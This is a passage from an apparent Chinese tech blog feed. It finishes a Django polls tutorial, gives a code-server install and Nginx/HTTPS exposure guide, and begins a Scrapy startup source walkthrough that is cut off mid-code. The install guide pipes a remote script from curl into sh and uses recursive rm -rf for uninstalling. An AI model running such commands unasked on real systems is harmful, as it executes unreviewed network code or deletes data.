<p>完整路径应该是<code>polls/templates/polls/index.html</code>,添加内容,生成一个问题列表,然后根据相应问题id跳转到详情页.</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> latest_question_list %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> question <span class="keyword">in</span> latest_question_list %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/polls/</span></span></span><span class="template-variable">&#123;&#123; question.id &#125;&#125;</span><span class="language-xml"><span class="tag"><span class="string">/&quot;</span>&gt;</span></span><span class="template-variable">&#123;&#123; question.question_text &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">else</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>No polls are available.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br></pre></td></tr></table></figure>

<p>创建<code>polls/templates/polls/detail.html</code>, 添加内容, 打印当前问题内容列表.</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><span class="template-variable">&#123;&#123; question.question_text &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> choice <span class="keyword">in</span> question.choice_set.all %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><span class="template-variable">&#123;&#123; choice.choice_text &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>关联对象API</strong> --- <code>_set</code></p>
<blockquote>
<p>Django 提供了从关联关系 <em>另一边</em> 访问的 API —— 从被关联模型到定义关联关系的模型的连接。<br>就如上, <code>question</code> 对象能通过 <code>choice_set</code> 属性访问包含所有关联 <code>choice</code> 对象的列表。</p>
</blockquote>
<h3 id="添加模板"><a href="#添加模板" class="headerlink" title="添加模板"></a>添加模板</h3><p>然后, 让我们更新一下 <code>polls/views.py</code> 里的来使用模板</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django.template <span class="keyword">import</span> loader</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Question</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    latest_question_list = Question.objects.order_by(<span class="string">&#x27;-pub_date&#x27;</span>)[:<span class="number">5</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 导入模板</span></span><br><span class="line">    template = loader.get_template(<span class="string">&#x27;polls/index.html&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">    <span class="comment"># 传递到模板里的上下文</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">&#x27;latest_question_list&#x27;</span>: latest_question_list,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.render(context, request))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还有一种更优雅的写法, 使用<code>django.shortcuts</code>内的<code>render()</code>快捷函数, 来简化了<code>loader</code>和<code>HttpResponse</code>的编写流程.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Question</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    latest_question_list = Question.objects.order_by(<span class="string">&#x27;-pub_date&#x27;</span>)[:<span class="number">5</span>]</span><br><span class="line">    context = &#123;<span class="string">&#x27;latest_question_list&#x27;</span>: latest_question_list&#125;</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;polls/index.html&#x27;</span>, context)</span><br></pre></td></tr></table></figure>

<p>这时候再看看页面,是不是样式就变了呢</p>
<img data-src="http://img.owq.world/2022/03/1151-83aa8f.png" style="zoom:80%;" />

<h3 id="处理404"><a href="#处理404" class="headerlink" title="处理404"></a>处理404</h3><p>问题id没有对应数据时抛出404</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> Http404</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detail</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        question = Question.objects.get(pk=question_id)</span><br><span class="line">    <span class="keyword">except</span> Question.DoesNotExist:</span><br><span class="line">        <span class="keyword">raise</span> Http404(<span class="string">&quot;Question does not exist&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;polls/detail.html&#x27;</span>, &#123;<span class="string">&#x27;question&#x27;</span>: question&#125;)</span><br></pre></td></tr></table></figure>

<p>同样也有更简洁的写法, 使用<code>get_object_or_404()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> get_object_or_404, render</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detail</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    question = get_object_or_404(Question, pk=question_id)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;polls/detail.html&#x27;</span>, &#123;<span class="string">&#x27;question&#x27;</span>: question&#125;)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>↑ pk 参数表示主键 &quot;primary key&quot;, 是 Django 提供查询的快捷方式 ↑ </p>
</blockquote>
<p>测试之前先修改下设置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DEBUG = <span class="literal">False</span>	<span class="comment"># 关闭调试</span></span><br><span class="line"></span><br><span class="line">ALLOWED_HOSTS = [<span class="string">&#x27;127.0.0.1&#x27;</span>]	<span class="comment"># 添加合法主机地址</span></span><br></pre></td></tr></table></figure>

<p>测试一下, 默认返回会是这个样子, 但实际应用上很少有网站会给用户返回这样简陋的页面, 一般是会做重定向处理的.</p>
<img data-src="http://img.owq.world/2022/03/1424-023cc2.png" style="zoom:80%;" />



<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>使用<code>HttpResponseRedirect()</code>进行重定向.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponseRedirect</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> reverse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detail</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        question = Question.objects.get(pk=question_id)</span><br><span class="line">    <span class="keyword">except</span> Question.DoesNotExist:</span><br><span class="line">        <span class="comment"># 重定向到主页</span></span><br><span class="line">        <span class="comment"># 注意这里如果报错找不到命名空间&#x27;polls&#x27;的话, 要去polls/urls.py设置app_name=&#x27;polls&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> HttpResponseRedirect(reverse(<span class="string">&#x27;polls:index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;polls/detail.html&#x27;</span>, &#123;<span class="string">&#x27;question&#x27;</span>: question&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="投票应用"><a href="#投票应用" class="headerlink" title="投票应用"></a>投票应用</h2><blockquote>
<p>接下来对这个投票应用进行完善, 熟悉下整体流程, 涉及具体的细节之后再深入.</p>
</blockquote>
<p>修改<code>polls/templates/polls/detail.html</code>, 添加表单元素.</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="comment">&#123;% comment %&#125; 这里使用软编码, url 代表当前的应用名 &#123;% endcomment %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;</span></span></span><span class="template-tag">&#123;% <span class="name"><span class="name">url</span></span> &#x27;polls:vote&#x27; question.id %&#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">csrf_token</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">legend</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><span class="template-variable">&#123;&#123; question.question_text &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> error_message %&#125;</span><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span></span><span class="template-variable">&#123;&#123; error_message &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> choice <span class="keyword">in</span> question.choice_set.all %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;choice&quot;</span> <span class="attr">id</span>=<span class="string">&quot;choice</span></span></span><span class="template-variable">&#123;&#123; forloop.counter &#125;&#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span> <span class="attr">value</span>=<span class="string">&quot;</span></span></span><span class="template-variable">&#123;&#123; choice.id &#125;&#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;choice</span></span></span><span class="template-variable">&#123;&#123; forloop.counter &#125;&#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span>&gt;</span></span><span class="template-variable">&#123;&#123; choice.choice_text &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Vote&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>修改<code>polls/templates/polls/results.html</code>, 显示投票结果.</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><span class="template-variable">&#123;&#123; question.question_text &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> choice <span class="keyword">in</span> question.choice_set.all %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><span class="template-variable">&#123;&#123; choice.choice_text &#125;&#125;</span><span class="language-xml"> -- </span><span class="template-variable">&#123;&#123; choice.votes &#125;&#125;</span><span class="language-xml"> vote</span><span class="template-variable">&#123;&#123; choice.votes|<span class="name">pluralize</span> &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;</span></span></span><span class="template-tag">&#123;% <span class="name"><span class="name">url</span></span> &#x27;polls:detail&#x27; question.id %&#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span>&gt;</span>Vote again?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>修改<code>vote()</code>方法, 实现完整的投票功能.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vote</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    question = get_object_or_404(Question, pk=question_id)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        selected_choice = question.choice_set.get(pk=request.POST[<span class="string">&#x27;choice&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> (KeyError, Choice.DoesNotExist):</span><br><span class="line">        <span class="comment"># 没有选择回到表单并提示错误信息</span></span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&#x27;polls/detail.html&#x27;</span>, &#123;</span><br><span class="line">            <span class="string">&#x27;question&#x27;</span>: question,</span><br><span class="line">            <span class="string">&#x27;error_message&#x27;</span>: <span class="string">&quot;You didn&#x27;t select a choice.&quot;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        selected_choice.votes += <span class="number">1</span></span><br><span class="line">        selected_choice.save()</span><br><span class="line">		<span class="comment"># 数据处理成功跳转到results页面</span></span><br><span class="line">        <span class="keyword">return</span> HttpResponseRedirect(reverse(<span class="string">&#x27;polls:results&#x27;</span>, args=(question.<span class="built_in">id</span>,)))</span><br></pre></td></tr></table></figure>

<p>到了这一步, 其实已经完成了基础功能了, 但不要忘记了Question对应Choice还没有进行创建.</p>
<p>修改<code>polls/admin.py</code>, 配置后台管理, 用于添加Choice.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Choice, Question</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChoiceInline</span>(admin.StackedInline):</span><br><span class="line">    model = Choice</span><br><span class="line">    extra = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuestionAdmin</span>(admin.ModelAdmin):</span><br><span class="line">    fieldsets = [</span><br><span class="line">        (<span class="literal">None</span>,               &#123;<span class="string">&#x27;fields&#x27;</span>: [<span class="string">&#x27;question_text&#x27;</span>]&#125;),</span><br><span class="line">        (<span class="string">&#x27;Date information&#x27;</span>, &#123;<span class="string">&#x27;fields&#x27;</span>: [<span class="string">&#x27;pub_date&#x27;</span>], <span class="string">&#x27;classes&#x27;</span>: [<span class="string">&#x27;collapse&#x27;</span>]&#125;),</span><br><span class="line">    ]</span><br><span class="line">    inlines = [ChoiceInline]</span><br><span class="line"></span><br><span class="line">admin.site.register(Question, QuestionAdmin)</span><br></pre></td></tr></table></figure>

<p>进入后台管理, 修改相应的选项保存后就可以进行测试了.</p>
<p><img data-src="http://img.owq.world/2022/03/1708-84d281.png"></p>
<p>测试一下</p>
<p><img data-src="http://img.owq.world/2022/03/1712-601d4a.png"></p>
<blockquote>
<p>到此, 算是对<code>Django</code>简单的入了个门, 下一篇文章详细讲讲<code>Django</code>中的模型层, 让咱们逐步深入ヾ(•ω•&#96;)o</p>
</blockquote>
]]></content>
      <categories>
        <category>学习教程</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>在浏览器上使用 vsCode 进行云开发</title>
    <url>/20130c79/</url>
    <content><![CDATA[<blockquote>
<p>项目地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvZGVyL2NvZGUtc2VydmVy">https://github.com/coder/code-server</span><br>官方文档 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9jb2Rlci5jb20vZG9jcy9jb2RlLXNlcnZlci9sYXRlc3QvZ3VpZGU=">https://coder.com/docs/code-server/latest/guide</span></p>
</blockquote>
<h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>为了实现在网页上进行云开发，需要用到<code>vsCode</code>开发的一款利器<code>code-server</code>， 因为<code>vsCode</code>是基于<code>Electron</code>开发的，而<code>Electron</code>是一款跨平台的、基于<code>Web</code>的桌面GUI应用程序开发框架。</p>
<p>所以<code>code-server</code>就是一款把<code>vsCode</code>托管成<code>Web</code>服务来达到云开发的利器~</p>
<p><strong>需要注意的点</strong></p>
<ul>
<li><code>code-server</code>目前不支持登录账号进行配置同步。</li>
<li><code>code-server</code>本身就是远程连接，即不支持使用<code>ssh-remote</code>进行套娃连接（未来有计划处理）。</li>
<li>部分快捷键和浏览器有冲突，要不处理<code>vsCode</code>，要不就处理浏览器。</li>
<li>使用时会获取服务器权限，暴露端口需做好安全措辞，防止意外。</li>
<li>综上，要在<code>code-server</code>进行日常开发需要大量配置，针对性场景较强（没有电脑的情况下）。</li>
</ul>
<h2 id="脚本安装"><a href="#脚本安装" class="headerlink" title="脚本安装"></a>脚本安装</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>先运行下测试，这条命令只是输出执行安装步骤，不会进行安装。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:<span class="regexp">//</span>code-server.dev/install.sh | sh -s -- --dry-run</span><br></pre></td></tr></table></figure>

<p><img data-src="http://img.owq.world/2022/01/2116-18d0a8.png"></p>
<p>可以看到是下载了<code>code-server_4.0.1_amd64.deb</code>包到<code>~/.cache/code-server/</code>下然后继续安装就完事了。<br>了解了下脚本做的事，接下来直接安装就行了。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:<span class="regexp">//</span>code-server.dev/install.sh | sh</span><br></pre></td></tr></table></figure>

<p><img data-src="http://img.owq.world/2022/01/1253-9d7fca.png"></p>
<p>这里你会可能会遇到<code>github</code>被墙导致下载不辽或者下载缓慢的问题，这时配置下<code>/etc/ssh/ssh_config</code>中的<code>GSSAPIAuthentication</code>设置为<code>no</code>一般就能解决问题，解决不辽问题的话就只能使用科学的魔法了~</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">vim ~<span class="regexp">/.config/</span>code-server/config.yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">bind-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8080</span>	<span class="comment"># 转发ip和端口</span></span><br><span class="line"><span class="attr">auth:</span> <span class="string">password</span>	<span class="comment"># 是否启用验证</span></span><br><span class="line"><span class="attr">password:</span> <span class="string">***</span>	<span class="comment"># 登录密码</span></span><br><span class="line"><span class="attr">cert:</span> <span class="literal">false</span>	<span class="comment"># 证书验证</span></span><br></pre></td></tr></table></figure>

<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now code-server@<span class="variable">$USER</span></span><br></pre></td></tr></table></figure>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>先使用<code>ssh</code>转发到本地端口后，浏览器打开<code>http://localhost:8080</code>进入登录页面</p>
<p><img data-src="http://img.owq.world/2022/01/1658-ae2061.png" alt="image-20220107165822570"></p>
<p>输入密码登录后就可以看到熟悉的开始页面了~</p>
<p><img data-src="http://img.owq.world/2022/01/1706-df356f.png"></p>
<p>先不急，为了让大部分快捷键可以正常使用，先把网页添加成应用<br><img data-src="http://img.owq.world/2022/01/1717-2a8ff3.png"></p>
<img data-src="http://img.owq.world/2022/01/1714-27070f.png" style="zoom: 50%;" />

<p>之后就开始配置你的<code>vsCode</code>吧~</p>
<h2 id="暴露公网"><a href="#暴露公网" class="headerlink" title="暴露公网"></a>暴露公网</h2><blockquote>
<p>官方推荐使用<code>SSH</code>进行转发连接，这种连接方式是最安全的，但实际情况反而浏览器使用率高，所以采用域名+https的方式来进行安全连接。</p>
</blockquote>
<h3 id="Nginx-代理转发"><a href="#Nginx-代理转发" class="headerlink" title="Nginx 代理转发"></a>Nginx 代理转发</h3><p>这里使用<code>Nginx</code>进行代理转发，具体配置请<strong>依自身情况进行修改</strong>。<br>使用<code>certbot</code>添加证书验证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装certbot</span></span><br><span class="line">sudo apt install -y certbot python3-certbot-nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建证书 并自动配置 Nginx</span></span><br><span class="line">sudo certbot --non-interactive --redirect --agree-tos --nginx -d [域名] -m [邮箱]</span><br></pre></td></tr></table></figure>

<p>生成的配置应该是这样子</p>
<p><img data-src="http://img.owq.world/2022/01/2205-ba41b1.png"></p>
<p>重载<code>nginx</code>应用配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -t <span class="comment"># 测试</span></span><br><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>

<p>这时使用域名就可以直接访问<code>vsCode</code>了</p>
<h2 id="完全卸载"><a href="#完全卸载" class="headerlink" title="完全卸载"></a>完全卸载</h2><blockquote>
<p>通过删除应用程序目录和用户配置目录，可以完全卸载<code>server-code</code>。</p>
</blockquote>
<p>卸载程序</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt <span class="built_in">remove</span> code-server</span><br></pre></td></tr></table></figure>

<p>删除设置和数据</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">rm -rf ~<span class="regexp">/.local/</span>share/code-server ~<span class="regexp">/.config/</span>code-server</span><br></pre></td></tr></table></figure>

<p>删除安装包</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">rm -rf ~<span class="regexp">/.cache/</span>code-server</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术记录</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>vsCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Scrapy 启动源码分析</title>
    <url>/66180b04/</url>
    <content><![CDATA[<blockquote>
<p>环境: Python 3.9<br>版本: Scrapy 2.5.1<br>IDE: vsCode</p>
</blockquote>
<h2 id="调试配置"><a href="#调试配置" class="headerlink" title="调试配置"></a>调试配置</h2><p>在项目模块下创建<code>run.py</code>文件, 使用<code>Scrapy</code>提供的命令来运行调试.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.cmdline <span class="keyword">import</span> execute</span><br><span class="line"></span><br><span class="line">execute(<span class="string">&#x27;scrapy crawl quotes&#x27;</span>.split())</span><br></pre></td></tr></table></figure>

<p>把调试程序设置为<code>run.py</code>的路径并设置启动目录, 之后点击调试就可以直接运行了.<br>因为<code>vsCode</code>默认会跳过第三方代码的调试, 还需要在配置里添加<code>&quot;justMyCode&quot;: false</code>, 才能调试非用户代码.</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Start Scrapy&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;python&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;run.py&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;justMyCode&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/scrapy/tutorial&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;console&quot;</span><span class="punctuation">:</span> <span class="string">&quot;integratedTerminal&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="启动逻辑"><a href="#启动逻辑" class="headerlink" title="启动逻辑"></a>启动逻辑</h2><p>查看<code>Scrapy</code>路径.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">which</span> scrapy</span><br><span class="line">/root/Application/miniconda3/envs/py-3.9/bin/scrapy</span><br></pre></td></tr></table></figure>

<p>先打开<code>Scrapy</code>文件看看.<br>可以看到最后是执行了<code>execute()</code>方法, 这个方法不正是我们用<code>Python</code>运行<code>Scrapy</code>的来进行调试的方法吗?</p>
<p><img data-src="http://img.owq.world/2022/01/1644-5f57fa.png"></p>
<p>接下来让我们进入内部看看它做了些什么, 这里只注重主逻辑, 一些细节处就不去刨析了.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">argv=<span class="literal">None</span>, settings=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> argv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        argv = sys.argv</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> settings <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        settings = get_project_settings()	<span class="comment"># 这里进行了配置的加载</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            editor = os.environ[<span class="string">&#x27;EDITOR&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            settings[<span class="string">&#x27;EDITOR&#x27;</span>] = editor</span><br><span class="line"></span><br><span class="line">    inproject = inside_project()</span><br><span class="line">    cmds = _get_commands_dict(settings, inproject)	<span class="comment"># 加载了Scrapy命令模块</span></span><br><span class="line">    cmdname = _pop_command_name(argv)</span><br><span class="line">    parser = optparse.OptionParser(formatter=optparse.TitledHelpFormatter(),</span><br><span class="line">                                   conflict_handler=<span class="string">&#x27;resolve&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cmdname:</span><br><span class="line">        _print_commands(settings, inproject)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmdname <span class="keyword">not</span> <span class="keyword">in</span> cmds:</span><br><span class="line">        _print_unknown_command(settings, cmdname, inproject)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    cmd = cmds[cmdname]	<span class="comment"># 命令行参数获取映射</span></span><br><span class="line">    parser.usage = <span class="string">f&quot;scrapy <span class="subst">&#123;cmdname&#125;</span> <span class="subst">&#123;cmd.syntax()&#125;</span>&quot;</span></span><br><span class="line">    parser.description = cmd.long_desc()</span><br><span class="line">    settings.setdict(cmd.default_settings, priority=<span class="string">&#x27;command&#x27;</span>)</span><br><span class="line">    cmd.settings = settings</span><br><span class="line">    